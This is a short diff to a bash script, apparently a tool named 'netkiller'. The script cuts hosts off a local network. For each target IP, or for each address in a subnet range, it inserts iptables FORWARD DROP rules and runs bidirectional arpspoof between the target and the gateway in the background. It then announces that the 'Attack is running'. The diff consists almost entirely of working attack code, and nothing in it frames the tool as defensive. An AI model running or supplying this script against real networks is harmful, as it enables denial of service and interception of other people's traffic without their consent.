@@ -92,27 +92,27 @@ for TARGET in $TARGET_IPS; do
             END=$(ip2int $HOSTMAX)
             for ((i=START; i<=END; i++)); do
                 TARGET_IP=$(int2ip $i)
-                (
                     # Block all the traffic except the device ip and gateway (bidirectional)
                     iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-                    iptables -I FORWARD ! -s "$GATEWAY" -d "$MYIP" -j DROP
-
+                    iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
+                (
                     arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
                     arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
                 ) &
             done
         fi
     else
-    (
         # Blocking traffic for Single IP
         iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
         iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP
 
         # Bidirectional Arp Spoofing policy
+    (   
         arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
         arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
     ) &
     fi
 done
-echo "Attack is running in the background...!!!"
-echo "To stop, Run: sudo netkiller-stop"
+echo "Netkiller Attack is running in the background..."
+echo ""
+echo "To stop, run: sudo netkiller-stop"
